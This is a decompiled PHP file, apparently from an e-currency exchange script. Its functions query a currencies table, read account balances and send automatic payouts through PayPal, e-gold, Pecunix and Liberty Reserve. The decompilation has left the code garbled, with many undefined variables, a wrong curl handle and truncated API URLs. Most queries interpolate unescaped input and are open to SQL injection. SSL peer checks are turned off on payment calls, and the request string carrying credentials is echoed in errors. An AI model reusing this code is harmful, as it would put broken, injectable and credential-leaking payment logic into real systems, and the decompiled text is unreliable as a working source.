<?php
/**
*
* @ This file is created by AtakanCan
* @ deZender Public (PHP5 Decompiler)
*
* @	Release on		:	25.07.2011
* @	Official site	:	http://AtakanCan
*
*/

function input_currency_select( $selected = "", $usagetype, $text = "", $css = "currency_select2", $disable = false, $dis_currency_no = "", $action = "", $Var_168 = "cid" )
{
    global $_currencies;
    global $STATUS_ENUM_ENABLE;
    $usagetype = $usagetype."_status";
    if ( 8 < strlen( $usagetype ) )
    {
        $SQL = "WHERE {$usagetype}='{$STATUS_ENUM_ENABLE}' ";
    }
    echo "<select class='{$css}' name='{$name}' id='{$name}'".( $disable ? "disabled" : "" )." onChange=\"{$action}\">";
    $query = "SELECT cid, currency_name, currency_metal_name FROM {$_currencies} {$SQL} ORDER BY cid asc";
    $result = db_query( $query, "&nbsp;" );
    while ( $line = db_fetch_array( $result ) )
    {
        $currency_name = ucfirst( $line[currency_name] )." ".ucfirst( $line[currency_metal_name] );
        if ( $dis_currency_no != $line['cid'] )
        {
            echo "<option ".show_input_selected( $line['cid'], $selected )." value=\"{$line['cid']}\">{$text} ".$currency_name."</option>";
        }
    }
    echo "</select>";
}

function input_money_radio( $radio, $val, $text = "" )
{
    global $DEF_MONEYS_ALLOWED;
    global $DEF_MONEYS;
    global $DEF_MONEY_NAME;
    global $DEF_MONEY_IMAGE;
    global $images;
    $i = 0;
    while ( $i < $DEF_MONEYS_ALLOWED )
    {
        echo "<input type=radio ".show_input_checked( $DEF_MONEYS[$i], $val )." value=\"{$DEF_MONEYS[$i]}\" name={$radio} style=\"BORDER: #FFFFFF 1px solid;\"><img src=".$images."/{$DEF_MONEY_IMAGE[$i]}> {$text}  {$DEF_MONEY_NAME[$i]}<br>";
        ++$i;
    }
}

function convert_emoney( $cid )
{
    global $_currencies;
    return db_get_id( "select currency_name from {$_currencies} WHERE cid='{$cid}'" );
}

function get_worth_name( $cid )
{
    global $_currencies;
    return db_get_id( "SELECT currency_worth_name FROM {$_currencies} WHERE cid='{$cid}'" );
}

function get_currency_data( $cid = "", $currency_name = "", $worth_value = "", $metal_name = "", $account_number = "" )
{
    global $_currencies;
    if ( $currency_name )
    {
        $sql = " Where currency_name='{$currency_name}'";
    }
    if ( $worth_value )
    {
        $sql .= " AND currency_worth_value='{$worth_value}'";
    }
    if ( $metal_name )
    {
        $sql .= " AND currency_metal_name='{$metal_name}'";
    }
    if ( $account_number )
    {
        $sql .= " AND ACCOUNT='{$account_number}'";
    }
    if ( $cid )
    {
        $sql = " Where cid='{$cid}'";
    }
    $query = "SELECT * From {$_currencies} ".$sql." limit 0,1";
    if ( !db_if_exists( $query ) )
    {
        Write_File( "<b>Currency Does NOT exist {$cid}, {$currency_name}, {$metal_name}</b>" );
    }
    $result = db_query( $query, "&nbsp;" );
    $line = db_fetch_array( $result );
    db_free_result( $result );
    return $line;
}

function get_all_reserved_amounts( )
{
    global $uploaded;
    global $_currencies;
    if ( !$dbconn )
    {
        $dbconn = db_open( );
    }
    $result = "<div style='width:98%; margin: 0px 0px 10px 0px; display: block; background: white; color: black; font-family: Verdana; border: 1px solid #cccccc; padding: 5px; font-size: 10px; line-height: 13px;'>";
    $result .= "We put this features for all currencies that support account balance read feature, <b>If your currency is working here without error that means your Automatic payout will work smoothly.</b>";
    $result .= "<br>You can easily update current reserved amounts by below balance values,( 'currencies exchange status must be enable with accurate data' ) :<br>";
    if ( 0 < db_get_id( "SELECT exchange_status FROM {$_currencies} WHERE currency_name='libertyreserve' AND ACCOUNT > '' ORDER BY exchange_status DESC limit 0,1" ) )
    {
        $result .= "<hr><br><h4>LibertyReserve</h4>";
        $result .= "<b>USD: </b>";
        $result .= vardump( fetch_liberty_AccountBalance( "LRUSD" ) );
        $result .= "<b>EURO: </b>";
        $result .= vardump( fetch_liberty_AccountBalance( "LREUR" ) );
    }
    unset( $arr_ACCOUNT_DATA );
    if ( !$demo_mode && 0 < db_get_id( "SELECT exchange_status FROM {$Var_888} WHERE currency_name='pecunix' AND ACCOUNT > '' ORDER BY exchange_status DESC limit 0,1" ) )
    {
        $result .= "<hr><br><h4>Pecunix</h4>";
        $result .= vardump( fetch_pecunix_AccountBalance( ) );
    }
    unset( $arr_ACCOUNT_DATA );
    if ( 0 < db_get_id( "SELECT exchange_status FROM {$_currencies} WHERE currency_name='v-money' AND ACCOUNT > ''  ORDER BY exchange_status DESC limit 0,1" ) )
    {
        $result .= "<hr><br><h4>V-money</h4>";
        $result .= vardump( fetch_vmoney_AccountBalance( ) );
    }
    unset( $arr_ACCOUNT_DATA );
    if ( 0 < db_get_id( "SELECT exchange_status FROM {$_currencies} WHERE currency_name='perfectmoney' AND ACCOUNT > '' ORDER BY exchange_status DESC limit 0,1" ) )
    {
        $result .= "<hr><br><h4>PerfectMoney</h4>";
        $result .= ( fetch_perfectmoney_AccountBalance( ) );
    }
    unset( $arr_ACCOUNT_DATA );
    if ( db_get_id( "SELECT exchange_status FROM {$_currencies} WHERE currency_name='webmoney' AND ACCOUNT <> '' AND API_NAME <> '' AND exchange_status <> '' ORDER BY cid" ) )
    {
        $result .= "<hr><br><h4>Webmoney</h4>";
        $result .= vardump( fetch_webmoney_AccountBalance( ) );
    }
    unset( $arr_ACCOUNT_DATA );
    if ( db_get_id( "SELECT exchange_status FROM {$_currencies} WHERE currency_name='paypal' AND ACCOUNT <> '' AND ALT_PASSWORD <> '' AND exchange_status <> '' ORDER BY cid" ) )
    {
        $result .= "<hr><br><h4>PayPal</h4>";
        $result .= vardump( fetch_paypal_AccountBalance( ) );
    }
    unset( $arr_ACCOUNT_DATA );
    $result .= "</div>";
    $result = str_replace( "Array", "", $result );
    $result = str_replace( ")", "", $result );
    $result = str_replace( "(", "", $result );
    return $result;
}

function fetch_paypal_AccountBalance( )
{
    $arr_PAYPAL = get_currency_data( "", "paypal" );
    $ramz = new RamzNegar( );
    $API_Password = urlencode( $ramz->decrypt( ramzkey( "number1" ), $arr_PAYPAL['MAIN_PASSWORD'] ) );
    $API_Signature = urlencode( $ramz->decrypt( ramzkey( "number1" ), $arr_PAYPAL['ALT_PASSWORD'] ) );
    $environment = trim( $arr_PAYPAL['API_NAME'] );
    $API_UserName = urlencode( $arr_PAYPAL['ACCOUNT'] );
    $API_Endpoint = "https://api-3t.paypal.com/nvp";
    if ( "sandbox" === $environment || "beta-sandbox" === $environment )
    {
        $API_Endpoint = "https://api-3t.{$environment}.paypal.com/nvp";
    }
    $version = urlencode( "51.0" );
    $ch = curl_init( );
    curl_setopt( $ch, CURLOPT_URL, $API_Endpoint );
    curl_setopt( $ch, CURLOPT_VERBOSE, 1 );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, FALSE );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
    curl_setopt( $Var_1680, CURLOPT_POST, 1 );
    $nvpreq = $Tmp_74."METHOD=GetBalance&VERSION={$version}&PWD={$API_Password}&USER={$API_UserName}&SIGNATURE={$API_Signature}{$nvpStr_}";
    curl_setopt( $ch, CURLOPT_POSTFIELDS, $nvpreq );
    $httpResponse = curl_exec( $ch );
    if ( !$httpResponse )
    {
        exit( "GetBalance failed: ".curl_error( $ch )."(".curl_errno( $ch ).")" );
    }
    $httpResponseAr = explode( "&", urldecode( $httpResponse ) );
    $httpParsedResponseAr = array( );
    foreach ( $httpResponseAr as $i => $value )
    {
        $tmpAr = explode( "=", $value );
        if ( 1 < sizeof( $tmpAr ) )
        {
            $httpParsedResponseAr[$tmpAr[0]] = $tmpAr[1];
        }
    }
    if ( 0 == sizeof( $httpParsedResponseAr ) || !array_key_exists( "ACK", $httpParsedResponseAr ) )
    {
        exit( "Invalid HTTP Response for POST request({$nvpreq}) to {$API_Endpoint}." );
    }
    if ( "Success" != $httpParsedResponseAr['ACK'] )
    {
        $arr_ACCOUNT_DATA['ERROR'] = "<b>GetBalance failed:</b> <br>";
    }
    $arr_ACCOUNT_DATA['BALANCE'] = $httpParsedResponseAr;
    return $arr_ACCOUNT_DATA;
}

function paypal_autopay( $to_account, $PAY_AMOUNT, $PAY_WORTH_VALUE = "" )
{
    global $MEMO;
    global $PAYMENT_ID;
    global $Message_log;
    $arr_PAYMENT_RESULT = array( );
    $arr_PAYPAL = get_currency_data( "", "paypal", $PAY_WORTH_VALUE );
    $arr_PAYPAL['ACCOUNT'] = $arr_PAYPAL['ACCOUNT'];
    $ramz = new RamzNegar( );
    $arr_PAYPAL['MAIN_PASSWORD'] = $ramz->decrypt( ramzkey( "number1" ), $arr_PAYPAL['MAIN_PASSWORD'] );
    $arr_PAYPAL['ALT_PASSWORD'] = $ramz->decrypt( ramzkey( "number1" ), $arr_PAYPAL['ALT_PASSWORD'] );
    $i = 0;
    $nvpStr = "&EMAILSUBJECT={$MEMO}&RECEIVERTYPE=EmailAddress&CURRENCYCODE={$arr_PAYPAL['currency_worth_value']}";
    $nvpStr .= "&L_EMAIL{$i}={$to_account}&L_Amt{$i}={$PAY_AMOUNT}&L_UNIQUEID{$i}={$PAYMENT_ID}&L_NOTE{$i}={$MEMO}";
    $API_Endpoint = "https://api-3t.paypal.com/nvp";
    if ( "sandbox" === $arr_PAYPAL['API_NAME'] || "beta-sandbox" === $arr_PAYPAL['API_NAME'] )
    {
        $API_Endpoint = "https://api-3t.{$arr_PAYPAL['API_NAME']}.paypal.com/nvp";
    }
    $version = urlencode( "51.0" );
    $ch = curl_init( );
    curl_setopt( $ch, CURLOPT_URL, $API_Endpoint );
    curl_setopt( $ch, CURLOPT_VERBOSE, 1 );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, FALSE );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
    curl_setopt( $ch, CURLOPT_POST, 1 );
    $nvpreq = "METHOD=MassPay&VERSION={$version}&PWD={$arr_PAYPAL['MAIN_PASSWORD']}&USER={$arr_PAYPAL['ACCOUNT']}&SIGNATURE={$arr_PAYPAL['ALT_PASSWORD']}".$nvpStr;
    curl_setopt( $ch, CURLOPT_POSTFIELDS, $nvpreq );
    $httpResponse = curl_exec( $ch );
    if ( !$httpResponse )
    {
        $arr_PAYMENT_RESULT['ERROR'] = "PayPal AutoPay failed: ".curl_error( $ch )."(".curl_errno( $ch ).")";
    }
    $httpResponseAr = explode( "&", urldecode( $httpResponse ) );
    $httpParsedResponseAr = array( );
    foreach ( $httpResponseAr as $i => $value )
    {
        $tmpAr = explode( "=", $value );
        if ( 1 < sizeof( $tmpAr ) )
        {
            $httpParsedResponseAr[$tmpAr[0]] = $tmpAr[1];
        }
    }
    if ( 0 == sizeof( $httpParsedResponseAr ) || !array_key_exists( "ACK", $httpParsedResponseAr ) )
    {
        $arr_PAYMENT_RESULT['ERROR'] = "Invalid HTTP Response for POST request({$nvpreq}) to {$API_Endpoint}.";
    }
    if ( "Success" != $httpParsedResponseAr['ACK'] )
    {
    }
    else
    {
        $arr_PAYMENT_RESULT['BATCH'] = $httpParsedResponseAr['CORRELATIONID'];
    }
    $Message_log[] = "Paypal auto payout class";
    Write_File( $arr_PAYMENT_RESULT, $httpParsedResponseAr );
    return $arr_PAYMENT_RESULT;
}

function isValid_egold_AccountNumber( $acct )
{
    return ereg( "^[0-9]{1,}\$", $acct );
}

function fetch_egold_AccountName( $account )
{
    global $arr_ACCOUNT_DATA;
    global $uploaded;
    $arr_ACCOUNT_DATA = array( );
    $arr_EGOLD = get_currency_data( "", "e-gold", "", "Gold" );
    $ramz = new RamzNegar( );
    $arr_EGOLD['MAIN_PASSWORD'] = $ramz->decrypt( ramzkey( "number1" ), $arr_EGOLD['MAIN_PASSWORD'] );
    if ( $uploaded )
    {
        $url = "https://www.e-gold.com/acct/verify.asp";
        $params = "AccountID=".$arr_EGOLD['ACCOUNT']."&PassPhrase=".$arr_EGOLD['MAIN_PASSWORD']."&Payee_Account=".$account."&Amount=0.4&PAY_IN=1&WORTH_OF=Gold&Memo=&PAYMENT_ID=125";
        $user_agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";
        $ch = curl_init( );
        curl_setopt( $ch, CURLOPT_POSTFIELDS, $params );
        curl_setopt( $ch, CURLOPT_URL, $url );
        curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1 );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 2 );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $ch, CURLOPT_TIMEOUT, 5 );
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE );
        curl_setopt( $ch, CURLOPT_USERAGENT, $user_agent );
        $result = curl_exec( $ch );
        if ( curl_errno( $ch ) != 0 )
        {
            $arr_ACCOUNT_DATA['ERROR'] = curl_error( $ch );
        }
        curl_close( $ch );
        if ( $arr_PAYMENT_RESULT['ERROR'] )
        {
            return $arr_PAYMENT_RESULT['ERROR'];
        }
        if ( stristr( $result, "ERROR" ) )
        {
            $result_data = explode( "\"", stristr( $result, "ERROR value=" ) );
            $arr_ACCOUNT_DATA['ERROR'] = strip_tags( $result_data[1] );
        }
        else
        {
            $result_data = explode( "\"", stristr( $result, "PAYEE_NAME value=" ) );
            $arr_ACCOUNT_DATA['NAME'] = strip_tags( $result_data[1] );
        }
        return $arr_ACCOUNT_DATA;
    }
}

function fetch_egold_AccountBalance( )
{
    global $arr_ACCOUNT_DATA;
    global $uploaded;
    $arr_ACCOUNT_DATA = array( );
    $arr_EGOLD = get_currency_data( "", "e-gold", "", "Gold" );
    $ramz = new RamzNegar( );
    $arr_EGOLD['MAIN_PASSWORD'] = $ramz->decrypt( ramzkey( "number1" ), $arr_EGOLD['MAIN_PASSWORD'] );
    $url = "https://www.e-gold.com/acct/balance.asp";
    $params = "PassPhrase=".$arr_EGOLD['MAIN_PASSWORD']."&AccountID=".$arr_EGOLD['ACCOUNT']."";
    $user_agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";
    if ( $uploaded )
    {
        $ch = curl_init( );
        curl_setopt( $ch, CURLOPT_POSTFIELDS, $params );
        curl_setopt( $ch, CURLOPT_URL, $url );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 2 );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $ch, CURLOPT_TIMEOUT, 5 );
        curl_setopt( $ch, CURLOPT_USERAGENT, $user_agent );
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE );
        $Var_1632 = curl_exec( $ch );
        if ( curl_errno( $ch ) != 0 )
        {
            $arr_ACCOUNT_DATA['ERROR'] = curl_error( $ch );
        }
        curl_close( $ch );
        if ( $arr_PAYMENT_RESULT['ERROR'] )
        {
            return $arr_PAYMENT_RESULT['ERROR'];
        }
        if ( strrpos( $result, "Error" ) || strrpos( $result, "ERROR" ) )
        {
            $result_data = explode( "<br>", stristr( $result, "Error" ) );
            $arr_ACCOUNT_DATA['ERROR'] = strip_tags( $result_data[1].$result_data[2].$result_data[3] );
        }
        else
        {
            $result_data = explode( "</", strstr( $result, "Gold_Grams" ) );
            $arr_ACCOUNT_DATA['BALANCE'] = strip_tags( $result_data[0] );
            $exploded = explode( ">", $result_data[0] );
            if ( $exploded[3] )
            {
                $arr_ACCOUNT_DATA['BALANCE'] = $exploded[3];
            }
            else
            {
                $arr_ACCOUNT_DATA['BALANCE'] = $result;
            }
        }
        Write_File( $arr_ACCOUNT_DATA, $result );
        return $arr_ACCOUNT_DATA;
    }
}

function egold_autopay( $PAYER_ACCOUNT = "", $PAYER_PASSWORD = "", $to_account, $PAY_AMOUNT, $PAY_METAL_NAME = "" )
{
    global $MEMO;
    global $PAYMENT_ID;
    global $uploaded;
    global $Message_log;
    $arr_PAYMENT_RESULT = array( );
    $arr_EGOLD = get_currency_data( "", "e-gold", "", "", $PAY_METAL_NAME );
    $ramz = new RamzNegar( );
    $arr_EGOLD['MAIN_PASSWORD'] = $ramz->decrypt( ramzkey( "number1" ), $arr_EGOLD['MAIN_PASSWORD'] );
    if ( !$PAYER_ACCOUNT )
    {
        $PAYER_ACCOUNT = $arr_EGOLD['ACCOUNT'];
    }
    if ( !$PAYER_PASSWORD )
    {
        $PAYER_PASSWORD = $arr_EGOLD['MAIN_PASSWORD'];
    }
    $url = "https://www.e-gold.com/acct/confirm.asp?";
    $params = "AccountID=".$PAYER_ACCOUNT."&PassPhrase=".$PAYER_PASSWORD."&Payee_Account=".$to_account."&PAYMENT_ID=".$PAYMENT_ID."&Amount=".$PAY_AMOUNT."&PAY_in=".$$arr_EGOLD['currency_worth_value']."&WORTH_OF=".$arr_EGOLD['currency_metal_name']."&Memo=".$MEMO."";
    $user_agent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)";
    if ( $uploaded )
    {
        $ch = curl_init( );
        curl_setopt( $ch, CURLOPT_POSTFIELDS, $params );
        curl_setopt( $ch, CURLOPT_URL, $url );
        curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1 );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 2 );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $ch, CURLOPT_TIMEOUT, 5 );
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE );
        curl_setopt( $ch, CURLOPT_USERAGENT, $user_agent );
        $i = 0;
        while ( $i < 1 )
        {
            $result = curl_exec( $ch );
            $url = "";
            ++$i;
        }
        if ( curl_errno( $ch ) != 0 )
        {
            $arr_PAYMENT_RESULT['ERROR'] = curl_error( $ch );
        }
        curl_close( $ch );
        if ( $arr_PAYMENT_RESULT['ERROR'] )
        {
            return $arr_PAYMENT_RESULT['ERROR'];
        }
        if ( strlen( $result ) == 0 || substr_count( $result, "</html>" ) < 1 || stristr( $result, "ERROR" ) )
        {
            if ( strlen( $result ) == 0 )
            {
                $arr_PAYMENT_RESULT['ERROR'] = "E-gold Server is Down, No response";
            }
            $result_data = explode( "\"", strstr( $result, "ERROR value=" ) );
            $arr_PAYMENT_RESULT['ERROR'] .= strip_tags( vardump( $result_data ) );
        }
        else
        {
            $BATCH = $str_tool->get_item( $result, "name=payment_batch_num value=", 1 );
            if ( empty( $BATCH ) )
            {
                $BATCH = $str_tool->get_item( $result, "PAYMENT_BATCH_NUM value=", 1 );
            }
            $BATCH = substr( $BATCH, 0, 14 );
            $BATCH = explode( "\"", $BATCH );
            $arr_PAYMENT_RESULT['BATCH'] = $BATCH[1];
            if ( empty( $arr_PAYMENT_RESULT['BATCH'] ) )
            {
                $arr_PAYMENT_RESULT['ERROR'] .= "E-gold payment: ".$PAYMENT_ID.", Check your E-gold transaction history to ensure that no transfers were made before trying to repeat the same transfers..<br>".htmlspecialchars( $result );
            }
        }
        $Message_log[] = "E-gold auto payout class";
        Write_File( $arr_PAYMENT_RESULT, $result );
        return $arr_PAYMENT_RESULT;
    }
}

function isValid_ebullion_AccountNumber( $acct )
{
    return ereg( "^(A|B|C|D|E|F)[0-9]{1,}\$", $acct );
}

function fetch_pecunix_AccountBalance( )
{
    global $arr_PECUNIX;
    $arr_PECUNIX = get_currency_data(  );
    $ramz = new RamzNegar( );
    $arr_PECUNIX['ALT_PASSWORD'] = $ramz->decrypt( ramzkey( "number1" ), $arr_PECUNIX['ALT_PASSWORD'] );
    $data = ""."\r\n\t<HistoryRequest>\r\n\t  <AccountId> ".$arr_PECUNIX['ACCOUNT']." </AccountId>\r\n\t  <First> -1 </First>\r\n\t  <Auth> \r\n\t\t<Token> ".$token." </Token>\r\n\t  </Auth>\r\n\t</HistoryRequest>\r\n\t";
    $i = 0;
    while ( $i < 1 )
    {
        $ch = curl_init( );
        curl_setopt( $ch, CURLOPT_URL, "https://pxi.pecunix.com/money.refined...history" );
        curl_setopt( $ch, CURLOPT_POST, 1 );
        curl_setopt( $ch, CURLOPT_POSTFIELDS, $data );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 2 );
        curl_setopt( $ch, CURLOPT_TIMEOUT, 5 );
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE );
        $result = curl_exec( $ch );
        if ( curl_errno( $ch ) != 0 )
        {
            $arr_ACCOUNT_DATA['ERROR'] = $Var_1944;
        }
        curl_close( $ch );
        ++$i;
    }
    if ( $arr_PAYMENT_RESULT['ERROR'] )
    {
        return $arr_PAYMENT_RESULT['ERROR'];
    }
    if ( stristr( $result, "errno" ) )
    {
        $result_data = explode( "</Additional>", strstr( $result, "<Additional>" ) );
        $arr_ACCOUNT_DATA['ERROR'] = strip_tags( $result_data[0] );
    }
    else
    {
        $result_data = explode( "</closingBalance>", strstr( $result, "<closingBalance>" ) );
        $arr_ACCOUNT_DATA['BALANCE'] = strip_tags( $result_data[0] );
    }
    return $arr_ACCOUNT_DATA;
}

function fetch_pecunix_AccountName( $account )
{
    global $arr_ACCOUNT_DATA;
    $arr_ACCOUNT_DATA = array( );
    $data = ""."\r\n\t<NameRequest>\r\n\t  <AccountId> ".$account." </AccountId>\r\n\t</NameRequest>\r\n\t";
    $i = 0;
    while ( $i < 1 )
    {
        $ch = curl_init( );
        curl_setopt( $ch, CURLOPT_URL, "https://pxi.pecunix.com/money.refined...name" );
        curl_setopt( $ch, CURLOPT_POST, 1 );
        curl_setopt( $ch, CURLOPT_POSTFIELDS, $data );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 2 );
        curl_setopt( $ch, CURLOPT_TIMEOUT, 5 );
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE );
        $result = curl_exec( $ch );
        if ( curl_errno( $ch ) != 0 )
        {
            $arr_ACCOUNT_DATA['ERROR'] = curl_error( $ch );
        }
        curl_close( $ch );
        ++$i;
    }
    if ( $arr_PAYMENT_RESULT['ERROR'] )
    {
        return $arr_PAYMENT_RESULT['ERROR'];
    }
    $result_data = explode( "</AccountName>", strstr( $result, "<AccountName>" ) );
    $Var_1632 = strip_tags( $result_data[0] );
    if ( $account_name == "unknown" )
    {
        $arr_ACCOUNT_DATA['ERROR'] = ucfirst( strip_tags( $result_data[0] ) )." Pecunix account ID.";
    }
    else
    {
        $arr_ACCOUNT_DATA['NAME'] = strip_tags( $result_data[0] );
    }
    return $arr_ACCOUNT_DATA;
}

function pecunix_autopay( $PAYER_ACCOUNT = "", $PAYER_PASSWORD = "", $to_account, $PAY_AMOUNT, $PAY_WORTH_VALUE )
{
    global $MEMO;
    global $PAYMENT_ID;
    global $Message_log;
    $arr_PAYMENT_RESULT = array( );
    $arr_PECUNIX = get_currency_data( "", "pecunix", $PAY_WORTH_VALUE );
    $ramz = new RamzNegar( );
    $arr_PECUNIX['MAIN_PASSWORD'] = $ramz->decrypt( ramzkey( "number1" ), $arr_PECUNIX['MAIN_PASSWORD'] );
    if ( !$PAYER_ACCOUNT )
    {
        $PAYER_ACCOUNT = $arr_PECUNIX['ACCOUNT'];
    }
    if ( !$PAYER_PASSWORD )
    {
        $PAYER_PASSWORD = $arr_PECUNIX['MAIN_PASSWORD'];
    }
    $token = strtoupper( md5( $PAYER_PASSWORD.":".gmdate( "Ymd:H" ) ) );
    $url = "https://pxi.pecunix.com/money.refined...transfer";
    $data = ""."\r\n\t<TransferRequest>\r\n\t<Transfer>\r\n\t<TransferId> ".$PAYMENT_ID." </TransferId>\r\n\t<Payer> ".$PAYER_ACCOUNT." </Payer>\r\n\t<Payee> ".$to_account." </Payee>\r\n\t<CurrencyId> GAU </CurrencyId>\r\n\t<Equivalent>\r\n\t<CurrencyId> ".$arr_PECUNIX['currency_worth_value']." </CurrencyId>\r\n\t<Amount> ".$PAY_AMOUNT." </Amount>\r\n\t</Equivalent>\r\n\t<FeePaidBy> Payee </FeePaidBy>\r\n\t<Memo> ".$MEMO." </Memo>\r\n\t</Transfer>\r\n\t<Auth>\r\n\t<Token> ".$token." </Token>\r\n\t</Auth>\r\n\t</TransferRequest>\r\n\t";
    $ch = curl_init( );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 2 );
    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
    curl_setopt( $ch, CURLOPT_TIMEOUT, 5 );
    curl_setopt( $ch, CURLOPT_URL, $url );
    curl_setopt( $ch, CURLOPT_POSTFIELDS, $data );
    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE );
    curl_setopt( $ch, CURLOPT_FAILONERROR, 1 );
    $i = 0;
    while ( $i < 1 )
    {
        $result = curl_exec( $ch );
        $data = "";
        ++$i;
    }
    if ( curl_errno( $ch ) != 0 )
    {
        $arr_PAYMENT_RESULT['ERROR'] = curl_error( $ch );
    }
    curl_close( $ch );
    if ( $arr_PAYMENT_RESULT['ERROR'] )
    {
        return $arr_PAYMENT_RESULT['ERROR'];
    }
    if ( strlen( $result ) == 0 || stristr( $result, "errno" ) )
    {
        if ( strlen( $result ) == 0 )
        {
            $arr_PAYMENT_RESULT['ERROR'] = "Pecunix Server is Down, No response";
        }
        $result_data = explode( "</Additional>", strstr( $result, "<Additional>" ) );
        $arr_PAYMENT_RESULT['ERROR'] .= strip_tags( $result_data[0] );
    }
    else
    {
        $result_data = explode( "</ReceiptId>", strstr( $result, "<ReceiptId>" ) );
        $arr_PAYMENT_RESULT['BATCH'] .= strip_tags( $result_data[0] );
        if ( empty( $arr_PAYMENT_RESULT['BATCH'] ) )
        {
            $arr_PAYMENT_RESULT['ERROR'] .= "Pecunix payment: ".$PAYMENT_ID.", Check your Pecunix transaction history to ensure that no transfers were made before trying to repeat the same transfers.<br>".htmlspecialchars( $result );
        }
    }
    $Message_log[] = "Pecunix auto payout class";
    Write_File( $arr_PAYMENT_RESULT, $result );
    return $arr_PAYMENT_RESULT;
}

function isValid_liberty_AccountNumber( $acct )
{
    return ereg( "^(U|X|u|x)[0-9]{1,}\$", $acct );
}

function create_liberty_Token( $secWord )
{
    $datePart = gmdate( "Ymd" );
    $timePart = gmdate( "H" );
    $authString = $secWord.":".$datePart.":".$timePart;
    $ver = explode( ".", phpversion( ) );
    if ( $ver[0] == 4 )
    {
        $sha256 = bin2hex( mhash( MHASH_SHA256, $authString ) );
    }
    else
    {
        $sha256 = hash( "sha256", $authString );
    }
    return strtoupper( $sha256 );
}

function fetch_liberty_AccountName( $account )
{
    global $arr_ACCOUNT_DATA;
    $arr_ACCOUNT_DATA = array( );
    $arr_LIBERTYRESERVE = get_currency_data( "", "libertyreserve" );
    $ramz = new RamzNegar( );
    $arr_LIBERTYRESERVE['MAIN_PASSWORD'] = $ramz->decrypt( ramzkey( "number1" ), $arr_LIBERTYRESERVE['MAIN_PASSWORD'] );
    $account = strtoupper( $account );
    $liberty_token = create_liberty_token( $arr_LIBERTYRESERVE['MAIN_PASSWORD'] );
    $data = $Tmp_45."</AccountToRetrieve>\r\n\t  </AccountName>\r\n\t</AccountNameRequest>";
    $i = 0;
    while ( $i < 1 )
    {
        $url = "https://api.libertyreserve.com/xml/accountname.aspx?req=".urlencode( $data );
        $ch = curl_init( );
        curl_setopt( $ch, CURLOPT_URL, $url );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $ch, CURLOPT_TIMEOUT, 5 );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 2 );
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE );
        $content = curl_exec( $ch );
        if ( curl_errno( $ch ) != 0 )
        {
            $arr_ACCOUNT_DATA['ERROR'] = curl_error( $ch );
        }
        curl_close( $ch );
        ++$i;
    }
    if ( $arr_PAYMENT_RESULT['ERROR'] )
    {
        return $arr_PAYMENT_RESULT['ERROR'];
    }
    $XML_RESULTS = xml2array( $content );
    if ( $XML_RESULTS[id][ERROR][TEXT] )
    {
        $arr_ACCOUNT_DATA['ERROR'] = $XML_RESULTS[id][ERROR][TEXT];
    }
    else
    {
        $arr_ACCOUNT_DATA['NAME'] = $XML_RESULTS[id][ACCOUNTNAME][NAME];
    }
    return $arr_ACCOUNT_DATA;
}

function fetch_liberty_AccountBalance( $currency_type )
{
    global $arr_LIBERTYRESERVE;
    $arr_LIBERTYRESERVE = get_currency_data( "", "libertyreserve" );
    $ramz = new RamzNegar( );
    $arr_LIBERTYRESERVE['MAIN_PASSWORD'] = $ramz->decrypt( ramzkey( "number1" ), $arr_LIBERTYRESERVE['MAIN_PASSWORD'] );
    $liberty_token = create_liberty_token( $arr_LIBERTYRESERVE['MAIN_PASSWORD'] );
    $data = "<BalanceRequest id=\"id\">\r\n\t  <Auth>\r\n\t  <ApiName>".$arr_LIBERTYRESERVE['API_NAME']."</ApiName>\r\n\t  <Token>".$liberty_token."</Token>\r\n\t  </Auth>\r\n\t\r\n\t  <Balance>\r\n\t\t<CurrencyId>".$currency_type."</CurrencyId>\r\n\t\t<AccountId>".$arr_LIBERTYRESERVE['ACCOUNT']."</AccountId>\r\n\t  </Balance>\r\n\t</BalanceRequest>";
    $i = 0;
    while ( $i < 1 )
    {
        $url = "https://api.libertyreserve.com/xml/balance.aspx?req=".urlencode( $data );
        $ch = curl_init( );
        ob_start( );
        curl_setopt( $ch, CURLOPT_URL, $url );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, FALSE );
        curl_setopt( $ch, CURLOPT_TIMEOUT, 5 );
        curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 2 );
        curl_setopt( $ch, CURLOPT_RETURNTRANSFER, TRUE );
        $content = curl_exec( $ch );
        if ( curl_errno( $ch ) != 0 )
        {
